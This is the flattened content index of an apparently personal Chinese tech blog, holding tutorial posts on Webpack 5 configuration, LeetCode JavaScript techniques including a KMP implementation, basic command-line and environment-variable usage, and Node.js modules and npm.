babel.config.*：新建文件，位于项目根目录。这几个的区别在于配置格式不一样。 babel.config.js babel.config.json .babelrc.*：新建文件，位于项目根目录。这几个的区别在于配置格式不一样。 .babelrc .babelrc.js .babelrc.json 在package.json 中配置babel：不需要创建文件，在原有文件基础上写。 Babel会查找和自动读取它们，所以以上配置文件只需要存在一个即可。下面以babel.config.js为例： 1234module.exports = &#123; // 预设 presets: [],&#125;; presets 预设是重点。简单理解：就是一组 Babel 插件, 扩展 Babel 功能。 @babel/preset-env: 一个智能预设，允许您使用最新的 JavaScript。可以吧ES6的一些语法（如箭头函数等）编译成ES5的语法。 @babel/preset-react：一个用来编译 React jsx 语法的预设 @babel/preset-typescript：一个用来编译 TypeScript 语法的预设 预设可以加载多个，也可以加载一个。用几个就加载几个。 Babel在webpack5中是loader。在官方文档中的loader-&gt;babel-loader中即可查看详情。要在webpack中使用，首先还是下载包：npm i babel-loader @babel/core @babel/preset-env -D。安装完成定义 Babel 配置文件babel.config.js并在其中添加： 123module.exports = &#123; presets: [&quot;@babel/preset-env&quot;],&#125;; 再在webpack.config.js的module列表中添加配置： 123456789101112module: &#123; rules: [&#123; test: /\\.js$/, exclude: /node_modules/, // 排除node_modules中的js文件（这些文件不会处理） //use: &#123; loader: &#x27;babel-loader&#x27;, //options: &#123; //presets: [&#x27;@babel/preset-env&#x27;] //&#125; //&#125; &#125;]&#125; 上面的use&#123;&#125;内的内容可以拿出来直接写（不用写use字段）。loader得在这里写，但下面的options可以在这写，胜在方便；也可以拿出来写到单独的配置文件babel.config.js里，方便之后进行修改等工作。在根目录新建文件babel.config.js，它和webpack的配置文件同级。写入内容如下： 1234module.exports = &#123; // 智能预设，能够编译ES6的语法。 presets: [&#x27;@babel/preset-env&#x27;]&#125; 处理Html资源目前每次打包完成之后的文件都是在index.html手工引入的，用的是语句 &lt;script src=&quot;../dist/static/js/main.js&quot;&gt;&lt;/script&gt;，这样做可能存在的问题是以后我们打包生成的文件可能不叫main.js，另外还可能打包生成好多js和css文件，不可能手动一个个引入，他们之间可能还存在依赖关系，引错了位置还会报错。希望它可以自动引入。 查阅官方文档的plugin-&gt;HtmlWebpackPlugin，按照上面的步骤进行下载、引入等操作。 下载：npm i html-webpack-plugin -D 在webpack.config.js配置：123456const HtmlWebpackPlugin = require(&quot;html-webpack-plugin&quot;);plugins: [ new HtmlWebpackPlugin(&#123; template: path.resolve(__dirname, &quot;public/index.html&quot;), &#125;),], 上面的配置项template:意味模版， 以 public/index.html为模板创建新的html文件。新的html文件有两个特点：1. dom结构和内容和源文件一致 2. 自动引入打包生成的js等资源。另外，由于希望让它自动引入，所以修改 index.html，去掉引入的 js 文件：&lt;script src=&quot;../dist/static/js/main.js&quot;&gt;&lt;/script&gt;，再运行npx webpack，即可看到结果，dist文件中生成了另外一个html文件，且需要的资源都已经被自动引入。 开发服务器&amp;自动化现在每次写完代码都需要手动输入指令才能编译代码，太麻烦了，我们希望一切自动化。利用webpack-dev-server。它可以在webpack里搭建一个服务器，自动监视src目录下的文件，一旦发生变化就会再自动打包一次。 下载：npm i webpack-dev-server -D 在webpack.config.js配置，devServer和plugins、mode同级：123456// 开发服务器devServer: &#123; host: &quot;localhost&quot;, // 启动服务器域名 port: &quot;3000&quot;, // 启动服务器端口号 open: true, // 是否自动打开浏览器&#125;, 需要注意的是，开发服务器并不会输出资源，它是在内存中进行编译打包的；也就是哪怕清空dist目录，也不会报错，也不会重新生成文件进入dist目录。 运行指令：npx webpack serve。一旦启用了devserver，那么启动指令也会发生变化，需要在后面加上serve。 生产模式介绍生产模式是开发完成代码后，我们需要得到代码将来部署上线。这个模式下我们主要对代码进行优化，让其运行性能更好。优化主要从两个角度出发：1. 优化代码运行性能 2. 优化代码打包速度 我们分别准备两个配置文件来放不同的配置。也就是开发模式有开发模式的配置文件；生产模式有生产模式的配置文件，它们分别独立互不干扰。文件目录如下：├── webpack-test (项目根目录) ├── config (Webpack配置文件目录) │ ├── webpack.dev.js(开发模式配置文件) │ └── webpack.prod.js(生产模式配置文件) ├── node_modules (下载包存放目录) ├── src (项目源码目录，除了html其他都在src里面) │ └── 略 ├── public (项目html文件) │ └── index.html ├── .eslintrc.js(Eslint配置文件) ├── babel.config.js(Babel配置文件) └── package.json (包的依赖管理配置文件) 在项目根目录下新建config文件夹，将webpack.config.js移进去，然后改名成 webpack.dev.js。把这个文件复制一个，然后改名成webpack.prod.js。 开发模式准备修改webpack.dev.js。因为开发模式没有输出，所以不需要指定输出目录；此外，由于文件目录变了，所以所有绝对路径需要回退一层目录才能找到对应的文件，不过由于运行实际上是在根目录中运行，所以入口的相对路径不需要改变，依然可以找得到需要的文件： 123456789101112131415161718192021...// 入口。注意是相对路径。 entry: &quot;./src/main.js&quot;,// 输出output: &#123; path: undefined, // 开发模式没有输出，不需要指定输出目录 filename: &quot;static/js/main.js&quot;, // 将 js 文件输出到 static/js 目录中 // clean: true, // 开发模式没有输出，不需要清空输出结果&#125;,plugins: [ new ESLintWebpackPlugin(&#123; // 指定检查文件的根目录 context: path.resolve(__dirname, &quot;../src&quot;), &#125;), new HtmlWebpackPlugin(&#123; // 以 public/index.html 为模板创建文件 // 新的html文件有两个特点：1. 内容和源文件一致 2. 自动引入打包生成的js等资源 template: path.resolve(__dirname, &quot;../public/index.html&quot;), &#125;), ],... 修改好后，运行开发模式的指令：npx webpack serve --config ./config/webpack.dev.js。 --config：指定要运行的配置文件在哪里。后面是路径。 生产模式准备修改webpack.prod.js。因为生产模式有输出，所以需要指定输出目录，输出目录的绝对路径需要回退一层；此外，由于文件目录变了，所以所有绝对路径需要回退一层目录才能找到对应的文件，不过由于运行实际上是在根目录中运行，所以入口的相对路径不需要改变，依然可以找得到需要的文件。生产模式还不需要devserver，它只打包输出文件即可。： 12345678910111213141516171819202122232425262728...// 入口。注意是相对路径。 entry: &quot;./src/main.js&quot;,// 输出output: &#123; path: path.resolve(__dirname, &quot;../dist&quot;), // 生产模式需要输出 filename: &quot;static/js/main.js&quot;, // 将 js 文件输出到 static/js 目录中 clean: true, // 开发模式有输出，需要清空输出结果&#125;,plugins: [ new ESLintWebpackPlugin(&#123; // 指定检查文件的根目录 context: path.resolve(__dirname, &quot;../src&quot;), &#125;), new HtmlWebpackPlugin(&#123; // 以 public/index.html 为模板创建文件 // 新的html文件有两个特点：1. 内容和源文件一致 2. 自动引入打包生成的js等资源 template: path.resolve(__dirname, &quot;../public/index.html&quot;), &#125;), ],// devServer: &#123;// host: &quot;localhost&quot;, // 启动服务器域名// port: &quot;3000&quot;, // 启动服务器端口号// open: true, // 是否自动打开浏览器// &#125;,// 模式 mode: &quot;production&quot;, // 此处指定的是开发环境。... 修改好后，运行生产模式的指令：npx webpack --config ./config/webpack.prod.js。可以看到dist文件夹被重新生成了，html和打包生成的js都被压缩了。 配置运行指令为了方便运行不同模式的指令，我们将指令定义在 package.json 中 scripts 里面 123456789// package.json&#123; // 其他省略 &quot;scripts&quot;: &#123; &quot;start&quot;: &quot;npm run dev&quot;, &quot;dev&quot;: &quot;npx webpack serve --config ./config/webpack.dev.js&quot;, &quot;build&quot;: &quot;npx webpack --config ./config/webpack.prod.js&quot; &#125;&#125; 以后启动指令，开发模式：npm start 或 npm run dev；生产模式：npm run build。start存放的是最常用的指令，除了start，别的都得加个run。 Css处理提取 Css 成单独文件Css 文件目前被打包到 js 文件中，当 js 文件加载时，会创建一个 style 标签来生成样式，也就是先加载js文件再生成样式。大概过程是，运行一个html文件，它会首先解析html代码，解析时会把所有结构渲染上去。下一阶段，会发现关于样式的div之类的也没有渲染，原因是浏览器此时正在解析js。等js文件开始解析后，在创建一个style标签再插入到页面上【style样式是js运行时动态生成插入的】。这样对于网站来说，会出现闪屏现象，用户体验不好。应该单独打包生成 Css 文件，通过 link 标签加载性能才好。在官方文档plugin-&gt;MiniCssExtractPlugin。本插件会将 CSS 提取到单独的文件中，为每个包含 CSS 的 JS 文件创建一个 CSS 文件，并且支持 CSS 和 SourceMaps 的按需加载。本插件基于 webpack v5 的新特性构建，并且需要 webpack 5 才能正常工作。 安装插件：npm i mini-css-extract-plugin -D 在webpack.prod.js引入插件：1const MiniCssExtractPlugin = require(&quot;mini-css-extract-plugin&quot;); 运行指令：npm run build。 Css兼容性处理js有兼容性问题，用babel处理。css也有兼容性问题。 下载包：npm i postcss-loader postcss postcss-preset-env -D。主要用的包是postcss-loader，它依赖于postcss，而postcss需要用上postcss-preset-env这个智能预设来解决样式的兼容性问题。 在webpack.prod.js配置。注意postcss-loader要在”css-loader”的后面、”less-loader”等的前面进行配置：12345678910111213MiniCssExtractPlugin.loader,&#x27;css-loader&#x27;,&#123; loader: &quot;postcss-loader&quot;, options: &#123; postcssOptions: &#123; plugins: [ &quot;postcss-preset-env&quot;, // 能解决大多数样式兼容性问题 ], &#125;, &#125;,&#125;,&#x27;less-loader&#x27;, 写的时候写成对象形式，这样可以用option对loader写其他配置。 控制兼容性：我们可以在 package.json 文件中添加 browserslist 来控制样式的兼容性做到什么程度。1234&#123; // 其他省略 &quot;browserslist&quot;: [&quot;ie &gt;= 8&quot;]&#125; 想要知道更多的 browserslist 配置，查看browserslist文档。以上为了测试兼容性所以设置兼容浏览器 ie8 以上。实际开发中我们一般不考虑旧版本浏览器了，所以我们可以这样设置：1234&#123; // 其他省略 &quot;browserslist&quot;: [&quot;last 2 version&quot;, &quot;&gt; 1%&quot;, &quot;not dead&quot;]&#125; 2 version\"```的意思是市面上所有浏览器都只能用最近两个版本；```\"> 1%\"```覆盖99%的浏览器，冷门的不要了；```\"not dead\"```指在发行中已经死了的，也不要。这三个取交集。1234567891011121314151617181920214. 合并配置：到此为止，配置文件中还有很多重复代码。在```webpack.prod.js```中定义函数：```javascript// 获取处理样式的Loadersconst getStyleLoaders = (preProcessor) =&gt; &#123; return [ MiniCssExtractPlugin.loader, &quot;css-loader&quot;, &#123; loader: &quot;postcss-loader&quot;, options: &#123; postcssOptions: &#123; plugins: [ &quot;postcss-preset-env&quot;, // 能解决大多数样式兼容性问题 ], &#125;, &#125;, &#125;, preProcessor, ].filter(Boolean);&#125;; 然后把用到这个返回值的所有地方替换成getStyleLoaders(xxx)即可。如123456789&#123; test: /\\.css$/, // 只检测.css文件，并对其使用下面的规则 use: getStyleLoaders(),&#125;,&#123; test: /\\.less$/, use: getStyleLoaders(&quot;less-loader&quot;)&#125;,// 其他省略 上面函数中的(preProcessor)和过滤器是为了处理除了返回值中的两个loader还有其它loader的情况，如less-loader等。如果没有传参，后面的preProcessor就是undefined，filter的作用就是过滤掉这些undefined，传一个boolean作为参数即可。 运行指令：npm run build。 Css压缩官方文档plugin-&gt;CssMinimizerWebpackPlugin。 安装插件：npm i css-minimizer-webpack-plugin -D 在webpack.prod.js引入插件：1234567const CssMinimizerPlugin = require(&quot;css-minimizer-webpack-plugin&quot;);plugins: [ ... // css压缩 new CssMinimizerPlugin(), ], 运行指令：npm run build。 Html压缩至于html文件和js文件，默认生产模式已经开启了html 压缩和 js 压缩。不需要额外进行配置。","categories":[{"name":"前端","slug":"前端","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"Webpack","slug":"前端/Webpack","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/Webpack/"}],"tags":[{"name":"Webpack","slug":"Webpack","permalink":"https://avalooooooon.github.io/tags/Webpack/"}]},{"title":"leetcode刷题常用技巧","slug":"leetcode刷题常用技巧","date":"2022-09-27T03:42:15.000Z","updated":"2022-09-27T03:42:15.000Z","comments":true,"path":"2022/09/27/leetcode刷题常用技巧/","link":"","permalink":"https://avalooooooon.github.io/2022/09/27/leetcode%E5%88%B7%E9%A2%98%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/","excerpt":"","text":"编程语言为js。 字符操作编码转换 转换为Unicode：stringObject.charCodeAt([index])，返回字符串中特定位置的字符的Unicode值。如果不提供index参数，则 charCodeAt() 方法将使用 0 作为默认值。常结合var basecode = &quot;a&quot;.charCodeAt()一起使用。 数值操作取整 截取整数+强制类型转换：parseInt(a)。将一个字符串中的 有效 整数拿出。可以用来取整。依次将字符串中从左到右的数字部分转为整数,一旦转换失败，返回NaN。正数向下取整，负数向上。可以接收第二个参数，为进制数。 移位运算符：&gt;&gt;或&lt;&lt;。以&gt;&gt;为例，(right - left) &gt;&gt; 1以为在二进制下右移一位并取整。正数向下取整。溢出 用mid = left + ((right - left) / 2)代替mid = (left + right) / 2)。 常量 js的最大安全整数：Number.MAX_SAFE_INTEGER。 js的无穷数：Infinity，类型为number。它比任何有限数都大，比如最大安全整数。 其它类型转换为Number数组方法一种方法可以有很多种使用方式，这里只列出最常用的。数组使用扩展运算符foo = &#123; ...[&#39;a&#39;, &#39;b&#39;, &#39;c&#39;] &#125;后的结果为&#123;0: &quot;a&quot;, 1: &quot;b&quot;, 2: &quot;c&quot;&#125;。如果扩展运算符后面是字符串，它会自动转成一个类似数组的对象。通过new Array(n).fill(value)等方法进行初始化。 删除元素 方法array.splice(index,num)：删除指定位置的元素，第一个参数为要删除第一项的位置，第二个参数为要删除的项数。返回值为删除内容，array为结果值。改变原数组。 方法array.shift()：删除数组的第一个元素。返回值为第一个元素的值。改变原数组。 增加元素 方法array.fill(value, start, end)：将一个固定值替换数组的元素。后两个参数可选，不写的话默认给整个数组填充。 方法array.push(item1, item2, ..., itemX)：添加元素到末尾。改变原数组。 方法array.unshift(item1, item2, ..., itemX)：添加元素到开头。改变原数组。 方法Array.concat(arr2,arr3,num)：将数组或值添加到结尾。不改变原数组。 使用扩展运算符...，如arr2 = [...arr1,4,5,6]：将一个数组（和其他元素）插入到另一个数组中。 查找元素 方法array.includes(&#39;a&#39;)：判断数组是否包含某元素，返回true 或者false。 遍历元素使用for(xxx of xxx)遍历数组。 尽量不要使用for in遍历数组！原因如下：for in的index索引为字符串型数字，不能直接进行几何运算；遍历顺序有可能不是按照实际数组的内部顺序；使用for in会遍历数组所有的可枚举属性，包括原型。for in更适合遍历对象。 方法array.reduce(function(prev,cur,index,arr)&#123;...&#125;,init)：对数组每个元素逐个执行一个reduce函数，返回值为结果。循环遍历能做的，reduce都可以做，比如数组求和、数组求积、数组中元素出现的次数、数组去重等等。 prev：必需。累计器累计回调的返回值; 表示上一次调用回调时的返回值，或者初始值 initcur：必需。表示当前正在处理的数组元素index可选，表示当前正在处理的数组元素的索引，若提供 init 值，则起始索引为- 0，否则起始索引为1；arr可选，表示原数组；init可选，表示初始值。 提取指定位置的元素 方法array.alice(start,end)：返回值为下标[start，end)位置上的新数组。改变原数组。注意包括start，但不包括end。数组与其他数据类型互相转化 方法Array.from()：从一个类似数组或可迭代对象创建一个新的，浅拷贝的数组实例。 方法str.split(&quot; &quot;)：字符串转数组。可以传一个参数作为切割标志，不传则默认切割每一个字符。 方法str.join(&quot;&quot;)：数组转字符串。 方法xxx.toString()或a = String(a)：数值转对应进制的数字字符串。 map方法 关键词：key个数不确定；哈希值比较少、特别分散、跨度非常大（此时使用数组作为哈希表会产生很大浪费）；还可以使用数组、字符串等类型作为map的key值。 通过new Map()等方法进行初始化。可以通过map[key]获得value。 查看key的value值&#x2F;key是否存在：map.set(tchar, map.has(tchar) ? map.get(tchar) + 1 : 1)。 遍历操作 forEach遍历：第一个参数是属性值，第二个参数是属性123map.forEach(function(value,key)&#123; console.log(value,key);&#125;) for-of遍历1234567for(let item of map)&#123; //遍历结果是数组，数组的每一项都是长为2的数组[key,value] //此时需要获取key就用item[0],value就是item[1]&#125;for(let item of map.values())&#123; //遍历属性值&#125; for(let item of map.keys())&#123; //遍历属性&#125; entries遍历12for(let item of map.entries())&#123; //遍历结果同forEach&#125; 字符串方法遍历操作 方法for(const i of str)：遍历。 链表注意———需要操作的节点是头节点时如何处理；链表结尾的判定：currnode.next !== null；链表中只有一个元素时如何处理；涉及到不容易想清楚的位置变换时记得画图，否则指针一多很容易乱。 使用js时，单链表可以如下定义： 1234function ListNode(val, next) &#123; this.val = (val===undefined ? 0 : val) this.next = (next===undefined ? null : next)&#125; 初始化： 1234567891011class Node &#123; constructor(val, next) &#123; this.val = val this.next = next &#125;&#125;var MyLinkedList = function () &#123; this._size = 0 this._head = null this._tail = null&#125;; 虚拟头节点dummyhead常定义一个指向真正头节点的虚拟头节点：var dummyhead = new ListNode(0,head);dummyhead.next = head。 优势：可以使原链表中的所有节点按统一的方式进行处理，包括头结点。注意return的是dummthead.next。 环形链表常涉及到数学运算，如判断是否有环和环入口时。必要时可以考虑将环形链表展开为直线再运算。常用方法：快慢双指针。根据是否相遇、何时相遇进行判断。 算法二分查找 关键字：有序数组、无重复元素、复杂度O(logn) 注意区间开闭（while (left &lt; right)、while(left &lt;= right)、right = middle、right = middle - 1？）。一般来说有两种常见选择，左闭右闭[left,right]；while (left &lt;= right)和左闭右开[left,right)；while (left &lt; right)。 双指针 关键字：数组&#x2F;链表&#x2F;字符串、不占用额外空间、保持相对顺序、复杂度O(n)反转问题、反转链表等，判断链表是否有环时也使用了快慢两个指针。很多数组填充类的问题也可以用双指针。预先给数组扩容带填充后的大小，然后在从后向前进行操作。N数之和：通过前后两个指针不算向中间逼近，在一个for循环下完成两个for循环的工作。N变大，则在三数之和的基础上再套一层for循环，依然是使用双指针法。 通过两个指针在一个for循环下完成两个for循环的工作。必须明确快慢指针各自的具体含义。比如快指针是在遍历中寻找满足条件的元素，慢指针是指向结果数组中存放满足条件的元素的下标（位置）。 滑动窗口 双指针的一种关键字：不占用额外空间、保持相对顺序、复杂度O(n) 明确：是以滑动窗口的起始位置还是终止位置为for循环的标识。 哈希表使用哈希法的标志：查询一个元素是否出现过、一个元素是否在集合里。 数组 关键字：key个数确定（如26个英文字母、指定较小字符集）；复杂度O(n) const resSet = new Array(26).fill(0); 缺点：数组大小有限，受到系统栈空间（不是数据结构的栈）的限制；如果数组空间够大但哈希值比较少、特别分散、跨度非常大，数组就会造成空间的极大浪费。 Map 关键词：key个数不确定；除了知道是否出现，还需要知道出现位置等其他信息（存在value里）；哈希值比较少、特别分散、跨度非常大；特殊：无限循环（快乐数）可以说是万能的哈希结构。但也存在更适合用Set或者数组的情况。 缺点： 占用空间比数组大，速度比数组慢 SetSet中的数只会出现一次。 关键词：只需要知道key值是否重复出现；快速判断一个元素是否出现在集合里 缺点：set是一个集合，里面放的元素只能是一个key，而类似两数之和的题目，不仅要判断y是否存在而且还要记录y的下标位置，所以set 也不能用。 KMP字符串匹配算法之一。当出现字符串不匹配时，通过记录已经匹配的文本内容，利用这些信息避免从头再去做匹配。使用KMP算法，一定要构造next数组。 next数组本质是前缀表。当在某个字符出发现模式串与主串(文本串)不匹配的时候，它会告诉我们下一步匹配中** 模式串 应该跳到哪个位置。前缀表：长度等于模式串的长度，模式串与前缀表对应位置的数字的含义即为记录该下标i之前（包括i）的字符串中，相同前缀后缀的 长度 **。 前缀&#x2F;后缀字符串的前缀：所有以第一个字符开头的连续子串，但不包含最后一个字符。字符串的后缀：所有以最后一个字符结尾的连续子串，但不包含第一个字符。当匹配过程中遇到了失配字符，考虑模式串在失配字符前（不包括失配字符）的字符串；失配字符在后缀子串的后面，所以找到与其相同的前缀的后面从新匹配就可以了。也即，遇到了失配字符， 此时我们要看它的前一个字符的前缀表的数值是多少。此外，根据前缀表的定义，如果前一个字符的前缀表的数值是k， 可以直接把指针跳到模式串下标为k的位置继续比较。这里不需要进行额外的数学计算（比如用当前位置的下标减去k+1什么的）。 next数组与前缀表的两种关系第一种情况，next数组完全就是前缀表。第二种情况，把前缀表统一减一（右移一位，初始位置为-1）之后作为next数组。它们的差别只有具体实现上略微不同，而不涉及到KMP的原理。 next数组的构造getNext（前缀表的计算） 以下是next数组完全就是前缀表的写法。 初始化：定义两个指针i和j，j指向前缀末尾位置，i指向后缀末尾位置。同时进行初始化操作int j = 0;next[0] = 0;。遍历方法为 for(int i = 1; i &lt; s.size(); i++)。这里j在循环外，对应循环中的下标为i-1的元素所对应的next值(长度）；也是这个next值所对应的从字符串开始位置开始的前缀末尾的下一个位置的下标. 处理前后缀不相同的情况：向前回退。next[j]就是记录着j（包括j）之前的子串的相同前后缀的长度。那么 s[i] 与 s[j] 不相同，就要找 j前一个元素在next数组里的值（就是next[j-1]）。 处理前后缀相同的情况：如果 s[i] 与 s[j + ] 相同，那么就同时向后移动i和j 说明找到了相同的前后缀，同时还要将移动后j（前缀的长度）赋给next[i], 因为next[i]要记录相同前后缀的长度。 使用Next数组进行匹配 力扣 28.实现strStr 题目的整体代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344/** * @param &#123;string&#125; haystack * @param &#123;string&#125; needle * @return &#123;number&#125; */var getNext = function (str) &#123; let next = [] let j = 0 // 这里j在循环外，对应循环中的下标为i-1的元素所对应的next值(长度）；也是这个next值所对应的从字符串开始位置开始的前缀末尾的下一个位置的下标. next.push(j) for (let i = 1; i &lt; str.length; i++) &#123; // 每次循环都有next.push(j)，这里相当于有：j = next[i-1]。 while (j &gt; 0 &amp;&amp; str[i] !== str[j]) &#123; j = next[j - 1] // j是结尾下标为i-1（长度i）的字符串的最长公共前后缀【长度】。j-1是这个最长公共前后缀的【结尾下标】。next[j-1]是结尾下标为j-1（长度j）的字符串的最长公共前后缀【长度】。注意上一行是【i】，这一行是【j】。 //所以再进入while时，str[j]就是上面注释提到的结尾下标为j-1（长度j）的字符串的最长公共前后缀【的下一个元素】。比较的逻辑和if是一样的了。同时注意j不能为0.（第一行中的最长公共前后缀长度如果为0，j都不用更新直接push进去就行） &#125; if (str[i] === str[j]) &#123; j += 1 &#125; next.push(j) &#125; return next&#125;var strStr = function (haystack, needle) &#123; if (needle == &#x27;&#x27;) &#123; return 0 &#125; var next = getNext(needle) var currlength = 0 for (let i = 0; i &lt; haystack.length; i++) &#123; while (currlength &gt; 0 &amp;&amp; haystack[i] != needle[currlength]) &#123; currlength = next[currlength - 1] &#125; if (haystack[i] == needle[currlength]) &#123; currlength++ &#125; if (currlength == needle.length) &#123; return (i - needle.length + 1) &#125; &#125; return -1&#125;; 反转系列 关键词：原地修改；不能申请额外空间，只能在本串上操作。常用方法：先整体反转再局部反转","categories":[{"name":"leetcode","slug":"leetcode","permalink":"https://avalooooooon.github.io/categories/leetcode/"}],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"https://avalooooooon.github.io/tags/leetcode/"}]},{"title":"命令行及环境变量","slug":"命令行及环境变量","date":"2022-09-21T08:27:12.000Z","updated":"2022-09-21T08:27:12.000Z","comments":true,"path":"2022/09/21/命令行及环境变量/","link":"","permalink":"https://avalooooooon.github.io/2022/09/21/%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%8A%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/","excerpt":"","text":"目录.： 表示当前目录，可以省略。(./style.css可以简写为style.css)..： 表示上一级目录 指令cd 目录名：进入指定目录dir：（win）列出当前目录下的所有文件ls：（mac）同上md 目录名：（win）在当前目录创建一个指定名字的文件夹mkdir 目录名：（mac&#x2F;Linux ）同上rd 目录名：（win）删除一个指定名字的文件夹（不经过回收站）rm 目录名：（mac&#x2F;Linux ）同上 环境变量（win）控制面板-&gt;高级系统设置-&gt;高级-&gt;环境变量。系统变量不同于用户变量的地方是，系统变量所有用户都可以用，而用户变量只有当前用户可以用。一般修改用户变量。 改完环境变量后需要重启命令行窗口。 path放的是一个个以分号结尾的路径。当我们在命令行窗口打开一个文件或调用一个程序时，系统会首先在当前目录下寻找文件程序。找到则直接打开；没找到则会依次到环境变量path的路径中寻找。一直没找到则报错。所以可以将一些经常需要访问的程序和文件的路径添加到path中，就可以在任意位置访问这些程序和文件了。","categories":[{"name":"shell","slug":"shell","permalink":"https://avalooooooon.github.io/categories/shell/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://avalooooooon.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"shell","slug":"shell","permalink":"https://avalooooooon.github.io/tags/shell/"}]},{"title":"node.js教程","slug":"node.js教程","date":"2022-09-21T08:23:17.000Z","updated":"2022-09-21T08:23:17.000Z","comments":true,"path":"2022/09/21/node.js教程/","link":"","permalink":"https://avalooooooon.github.io/2022/09/21/node.js%E6%95%99%E7%A8%8B/","excerpt":"","text":"简介Node.js是一个能够在服务器端运行JS的开放源代码的跨平台的JS运行环境。它基于谷歌的V8引擎，使用事件驱动、非阻塞和异步I&#x2F;O模型等技术来提高性能，可优化应用程序的传输量和规模。在nodejs出现之前，JS通常作为客户端程序设计语言使用，以JS写出的程序常在用户的浏览器上运行。 传统服务器一般都是多线程，每进来一个请求就会创建一个线程。 但服务器返回响应之前需要先和数据库交互，涉及到磁盘相关的I&#x2F;O处理，但I&#x2F;O处理速度有瓶颈难以提升，所以可能会有很多线程在服务器进行等待，即I&#x2F;O操作阻塞了线程的执行。此时这些线程虽然不干活，但也占用了服务器的内存。 node的服务器是单线程的。不过Node处理请求时是单线程，但是在后台拥有一个I&#x2F;O线程池。 对于nodejs，单线程是它的一大特点，即所有请求都只有一个线程，也不太会出现I&#x2F;O阻塞。但单线程也使得它无法处理访问量太大的应用（那种一般用JAVA)；所以它的主要用处就是web服务器。比如某宝，客户端需要和用java开发的服务器交互，而java的优势在于处理请求很快，但渲染页面慢；js恰好有页面渲染快的优点。所以可以在上图的客户端和服务器中间来一层node服务器，这个服务器专门用来渲染页面。 安装成功后，在终端输入node回车即可进入node环境（win需要配置环境变量）。输入node 文件名.js即可运行指定名字的js文件中的代码。 模块化ES标准的缺陷：没有模块系统（ES6新增）、标准库较少、没有标准接口、缺乏管理系统。模块化可以有多种形式，但至少应该提供能够将代码分割为多个源文件的机制；CommonJS的模块功能可以帮我们解决该问题。 CommonJS规范它的提出主要是为了弥补当前JS没有标准的缺陷。它对模块的定义十分简单：即模块引用、模块定义和模块标识。 模块分为两大类： 核心模块：由node引擎提供的模块。核心模块的标识就是模块的名字。 文件模块：由用户自己创建的模块。文件模块的标识就是文件的路径，常用相对路径。注意不要使用路径前的.或..。 require()函数在node中有一个全局对象global，它的作用和网页中的window类似；在全局中创建的变量都会作为global的属性保存，在全局中创建的函数都会作为global的方法保存。（注意在js中，声明变量时如果不用var，即用a = 10的方式声明，则该变量自动为全局变量。）当node在执行模块中的代码时，它会首先在代码的最顶部添加如下代码（右 大括号在代码底部添加）：function(exports,require,module,__filename,__dirname)&#123;&#125;实际上模块中的代码都是包装在这个函数中执行的，并且在函数执行时同时传递进了5个实参： exports：该对象用来将变量或函数暴露到外部 require：函数，用来引入外部模块 module：它代表的就是当前模块本身，**exports就是module的属性**。既可以使用exports导出，也可以使用module.exports导出。 __filename：当前模块的完整路径（最后一级是该模块的名字） __dirname：当前模块所在文件夹的完整路径（最后一级是该模块所在文件夹的名字） 在node中，一个js文件就是一个模块。在node中，每一个js文件中的js代码都是独立运行在一个函数中，而不是全局作用域。每个模块之间都是闭包。 所以虽然在被引入的模块里，有些东西看起来是定义在全局里的，也无法直接访问到。是因为相当于在外面又套了一层function()&#123;&#125;。一个模块中的变量和函数在其他模块中无法访问。 通过require()函数来引入外部模块。 函数require()：可以传递一个文件的路径作为参数，node将会自动根据该路径引入外部模块。注意，如果使用相对路径，必须以.或..开头（不能随便省略！）。使用require()引入模块后，该函数会返回一个对象，这个对象（如下面的md）代表的是引入的模块。var md = require(&quot;./temp.js&quot;) 使用require()引入外部模块时使用的就是模块标识。我们可以通过模块标识来找到指定的模块。 暴露可以通过exports来向外部暴露变量和方法，将需要暴露给外部的变量或方法设置为exports的属性即可，即exports.xxx=...。exports.x = &quot;w我是temp.js中的x&quot; 关于exports 和 module.exports exports只能使用.的方式向外暴露内部变量，如exports.xxx = xxx。而module.exports既可以通过.的方式，也可以直接赋值，如module.exports.xxx = xxx或module.exports = &#123;&#125;。 npm和包包实际上就是一个压缩文件，解压后还原为目录。CommonJS的包规范由包结构（用于组织包中的各种文件）和包描述文件（描述包的相关信息，以供外部读取分析）两个部分组成。 符合规范的目录应该包含如下文件：——package.json 描述文件（只有这个是必须的，其他四个可选）。里面的字段有name、description、version等。可以通过npm init生成。 命令npm init和npm init -y的作用是： 对项目进行初始化操作，对包进行管理。参数 -y 的含义：yes的意思，在init的时候省去了敲回车的步骤，生成的都是默认的package.json。 ——bin 可执行二进制文件——lib JS代码——doc 文档——test 单元测试 .json文件中不支持写注释。 NPM（Node Package Manager）：帮助Node完成了第三方模块的发布、安装和依赖等。它不需要安装，安装完node之后自带npm。通过npm下载的包都放到node_modules文件夹中，通过npm下载的包直接通过包名引入即可。node在使用模块名字来引入模块时，它会首先在当前目录的node_modules中寻找是否含有该模块。如果有则直接使用，如果没有则去上一级目录的node_modules找；没有再找上一级，直到找到为止。直到找到磁盘的根目录。如果依然没有，则报错。——npm -v：查看版本——npm search 包名：搜索模块包——npm install 包名：在当前目录安装包——npm install 包名 -g：全局模式安装包。全局安装的包一般都是一些工具。——npm remove 包名：删除包——npm install 包名 --save：安装包并添加到依赖中（package.json–dependencies)。再配合npm install可直接下载当前项目所依赖的包并创建node_modules文件夹。npm remove 包名 --save类似，也是从依赖中同时删除。 需要注意 package.json 中 name 字段不能和取成包的名字！ 否则下载同样名字的包时会报错。 ——npm config set registry 地址：设置镜像源——npm install 包名 -registry=地址：从镜像源安装 cnpmnpm服务器在美国，在下载包的时候可能会遇到一些问题。可以直接搜索淘宝的cnpm查看教程。 补充：npx npx侧重于执行命令——执行某个模块命令。虽然会自动安装模块，但是重在执行某个命令。npm侧重于安装或者卸载某个模块的。重在安装，并不具备执行某个模块的功能。 npm从5.25.2版开始，增加了 npx 命令，方便在项目中使用全局包。Node安装后自带npm模块，可以直接使用npx命令。如果不能使用，就要手动安装一下：npm install -g npx。 